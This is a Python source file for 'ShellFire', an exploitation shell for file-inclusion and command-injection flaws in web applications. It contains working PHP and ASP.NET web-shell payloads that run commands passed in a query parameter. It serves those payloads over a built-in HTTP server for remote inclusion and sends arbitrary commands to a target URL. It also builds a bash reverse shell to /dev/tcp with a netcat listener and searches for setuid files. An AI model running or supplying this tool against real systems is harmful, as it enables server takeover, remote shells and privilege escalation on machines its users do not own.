#!/usr/bin/python
# Thanks to Offensive-Security for inspiring this!
# Written by Unix-Ninja
# Aug 2016
# Thanks to Offensive-Security for inspiring this!

import argparse
import json
import os
import re
import readline
import requests
import socket
import sys
import threading
import time

############################################################
## Configs

version = "0.2"
url = "http://www.example.com?"
history_file = os.path.abspath(os.path.expanduser("~/.shellfire_history"))
post_data = {}
cookies = {}
payload = ""
payload_type = "PHP"

############################################################
## Payloads

def payload_aspnet():
  global payload
  global payload_type
  payload = """\
--9453901401ed3551bc94fcedde066e5fa5b81b7ff878c18c957655206fd538da--<%
Dim objShell = Server.CreateObject("WSCRIPT.SHELL")
Dim command = Request.QueryString("cmd")

Dim comspec = objShell.ExpandEnvironmentStrings("%comspec%")

Dim objExec = objShell.Exec(comspec & " /c " & command)
Dim output = objExec.StdOut.ReadAll()
%><%= output %>--9453901401ed3551bc94fcedde066e5fa5b81b7ff878c18c957655206fd538da--
"""
  payload_type = "ASP.NET"

def payload_php():
  global payload
  global payload_type
  payload = """\
--9453901401ed3551bc94fcedde066e5fa5b81b7ff878c18c957655206fd538da--<?php
if ($_GET['cmd'] == '_show_phpinfo') {
  phpinfo();
} else if ($_GET['cmd'] == '_show_cookie') {
  var_dump($_COOKIE);
} else if ($_GET['cmd'] == '_show_get') {
  var_dump($_GET);
} else if ($_GET['cmd'] == '_show_post') {
  var_dump($_POST);
} else if ($_GET['cmd'] == '_show_server') {
  var_dump($_SERVER);
} else {
  system($_GET['cmd']) || print `{$_GET['cmd']}`;
}
?>--9453901401ed3551bc94fcedde066e5fa5b81b7ff878c18c957655206fd538da--
"""
  payload_type = "PHP"

############################################################
## Functions

def show_help(cmd=None):
  if cmd and cmd[0:1] == '.':
    cmd = cmd[1:]
  if cmd == "cookies":
    sys.stdout.write(".cookies <json> - a json string representing cookies you wish to send\n")
  elif cmd == "find":
    sys.stdout.write(".find setuid - search for setuid files\n")
    sys.stdout.write(".find setgid - search for setgid files\n")
  elif cmd == "history":
    sys.stdout.write(".history clear - erase history\n")
    sys.stdout.write(".history nosave - do not write history file\n")
    sys.stdout.write(".history save - write history file on exit\n")
  elif cmd == "http":
    sys.stdout.write(".http - show status of HTTP server\n")
    sys.stdout.write(".http payload [type] - set the payload to be used for RFI\n")
    sys.stdout.write("                       supported payload types:\n")
    sys.stdout.write("                       aspnet\n")
    sys.stdout.write("                       php\n")
    sys.stdout.write(".http start [port] - start HTTP server\n")
    sys.stdout.write(".http stop - stop HTTP server\n")
  elif cmd == "method":
    sys.stdout.write(".method - show current HTTP method\n")
    sys.stdout.write(".method get - set HTTP method to GET\n")
    sys.stdout.write(".method post - set HTTP method to POST\n")
  elif cmd == "post":
    sys.stdout.write(".post <json> - a json string representing post data you wish to send\n")
  elif cmd == "shell":
    sys.stdout.write(".shell <ip_address> <port> - initiate reverse shell to target\n")
  else:
    sys.stdout.write("""\
Available commands:
  .cookies
  .exit
  .find
  .help
  .history
  .http
  .method
  .phpinfo
  .post
  .shell
  .url
  .quit
""")

def http_server(port):
  global http_running
  addr = ''
  conn = None

  sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
  sock.settimeout(1)
  sock.bind((addr, port))
  sock.listen(1)
  while http_running == True:
    try:
      if not conn:
        conn, addr = sock.accept()
      request = conn.recv(1024)

      http_response = "HTTP/1.1 200 OK\n\n" + payload

      conn.sendall(http_response)
      conn.close()
      conn = None
    except:
      pass
  sys.stdout.write("[*] HTTP Server stopped\n")

def rev_shell(addr, port):
  global revshell_running
  conn = None
  sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
  sock.bind((addr, port))
  sock.listen(1)
  conn, client_address = sock.accept()

  while True:
    try:
      response = raw_input("?? ")
      conn.sendall(response)
      request = conn.recv(1024)
    except socket.error as err:
      print (err, type(err))
    except socket.timeout:
      sys.stdout.write("[!] Socket timeout\n")
      pass
  conn.close()
  revshell_running = False


############################################################
## Parse options

parser = argparse.ArgumentParser(description='Exploitation shell for LFI/RFI and command injection')
parser.add_argument('-d', dest='debug', action='store_true', help='enable debugging (show queries during execution)')
args = parser.parse_args()

############################################################
## Main App

sys.stdout.write("[*] ShellFire v" + version + "\n")
sys.stdout.write("[*] Type '.help' to see available commands\n")

requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)

global http_running
http_running = False

global revshell_running
revshell_running = False

method = "get"

## setup history
if os.path.isfile(history_file):
  try:
    readline.read_history_file(history_file)
  except:
    pass

## set initial payload for PHP
payload_php()

## main loop
while True:
  while revshell_running:
    time.sleep(0.1)
  exec_cmd = False
  input = raw_input('>> ')
  if not input:
    continue
  cmd = input.split()
  if cmd[0] == ".exit" or cmd[0] == ".quit":
    http_running = False
    if os.path.isfile(history_file):
        readline.write_history_file(history_file)
    sys.exit(0)
  elif cmd[0] == ".cookies":
    if not len(cmd) >2:
      sys.stdout.write("[!] Invalid parameters\n")
      continue
    cookies = json.loads(input[8:])
  elif cmd[0] == ".find":
    if len(cmd) is not 2:
      sys.stdout.write("[!] Invalid parameters\n")
      continue
    exec_cmd = True
    if cmd[1] == "setgid":
      input = "find / -type f -perm -02000 -ls"
    elif cmd[1] == "setuid":
      input = "find / -type f -perm -04000 -ls"
    else:
      sys.stdout.write("[!] Invalid parameters\n")
      exec_cmd = False
  elif cmd[0] == ".help":
    if len(cmd) == 2:
      show_help(cmd[1])
    else:
      show_help()
  elif cmd[0] == ".history":
    if len(cmd) == 1:
      if os.path.isfile(history_file):
        sys.stdout.write("[*] History writing is enabled\n")
      else:
        sys.stdout.write("[*] History writing is disabled\n")
    else:
      if cmd[1] == "clear":
        readline.clear_history()
        sys.stdout.write("[*] History is cleared\n")
      elif cmd[1] == "save":
        with open(history_file, 'a'):
          os.utime(history_file, None)
        sys.stdout.write("[*] History writing is enabled\n")
      elif cmd[1] == "nosave":
        os.remove(history_file)
        sys.stdout.write("[*] History writing is disabled\n")
  elif cmd[0] == ".http":
    if len(cmd) == 1:
      if http_running == True:
        sys.stdout.write("[*] HTTP server listening on %s\n" % port)
        sys.stdout.write("[*] HTTP payload: %s\n" % payload_type)
      else:
        sys.stdout.write("[*] HTTP server is not running\n")
      continue
    if cmd[1] == "start":
      if http_running == False:
        http_running = True
        if len(cmd) > 2:
          port = int(cmd[2])
        else:
          port = 8888
        s = threading.Thread(target=http_server, args=(port,))
        s.start()
        sys.stdout.write("[*] HTTP server listening on %s\n" % port)
      else:
        sys.stdout.write("[!] HTTP server already running\n")
    elif cmd[1] == "stop":
      if http_running == True:
        http_running = False
        time.sleep(1)
      else:
        sys.stdout.write("[!] HTTP server already stopped\n")
    elif cmd[1] == "payload":
      if cmd[2] == "aspnet":
        payload_aspnet()
      elif cmd[2] == "php":
        payload_php()
      else:
        sys.stdout.write("[!] Unrecognized payload type\n")
        continue
      sys.stdout.write("[*] HTTP payload set: %s\n" % payload_type)
  elif cmd[0] == ".method":
    if len(cmd) > 2:
      sys.stdout.write("[!] Invalid parameters\n")
      sys.stdout.write("    .method <method>\n")
      continue
    if len(cmd) is 2:
      if cmd[1] == "post":
        method = "post"
      else:
        method = "get"
    sys.stdout.write("[*] HTTP method set to %s\n" % method.upper())
  elif cmd[0] == ".phpinfo":
    input = "_show_phpinfo"
    exec_cmd = True
  elif cmd[0] == ".post":
    if len(cmd) < 2:
      post = {}
    else:
      post = json.loads(input[6:])
    sys.stdout.write("[*] POST data set to %s\n" % post)
  elif cmd[0] == ".shell":
    if len(cmd) is not 3:
      sys.stdout.write("[!] Invalid parameters\n")
      sys.stdout.write("    .shell <ip_address> <port>\n")
      continue
    sys.stdout.write("[*] Initiating reverse shell...\n")
    host = cmd[1]
    port = cmd[2]
    input = "bash -i >& /dev/tcp/" + host + "/" + port + " 0>&1"
    ## I was having trouble setting up a listener in python that works
    ## for now, call netcat, but we need to fix this later
    os.system("nc -vl " + port)
    #s = threading.Thread(target=rev_shell, args=(cmd[1],int(cmd[2])))
    #s.start()
    #revshell_running = True
    ## make sure the thread is init before proceeding
    #time.sleep(1)
    #exec_cmd = True
  elif cmd[0] == ".url":
    if len(cmd) > 1:
      url = input[5:]
      sys.stdout.write("[*] Exploit URL set\n")
    else:
      sys.stdout.write("[*] Exploit URL is %s\n" % url)
  else:
    exec_cmd = True

  if exec_cmd:
    cmd = re.sub('&', '%26', input)
    cmd = cmd.replace("\\", "\\\\")
    if '%CMD%' in url:
      query = re.sub('%CMD%', cmd, url)
    else:
      if '?' in url:
        if 'cmd=' not in url:
          query = url + '&cmd=' + cmd
        else:
          query = re.sub('cmd=', 'cmd=' + cmd, url)
      else:
        query = url
    if args.debug:
      sys.stdout.write("[Q] " + query + "\n")
    try:
      if method == "post":
        r = requests.post(query, data=post, verify=False, cookies=cookies)
      else:
        r = requests.get(query, verify=False, cookies=cookies)
      ## sanitize the output. we only want to see our commands if possible
      output = r.text.split('--9453901401ed3551bc94fcedde066e5fa5b81b7ff878c18c957655206fd538da--')
      if len(output) > 1:
        output = output[1]
      else:
        output = output[0]
      ## display our results
      print output
      if input == '_show_phpinfo':
        file = 'phpinfo.html'
        fp = open(file, 'w')
        fp.write(output)
        fp.close()
        sys.stdout.write("[*] Output saved to " + file + "\n")
    except Exception, e:
      sys.stdout.write("[!] Unable to make request to target\n")
      print ("[!] %s" % e)

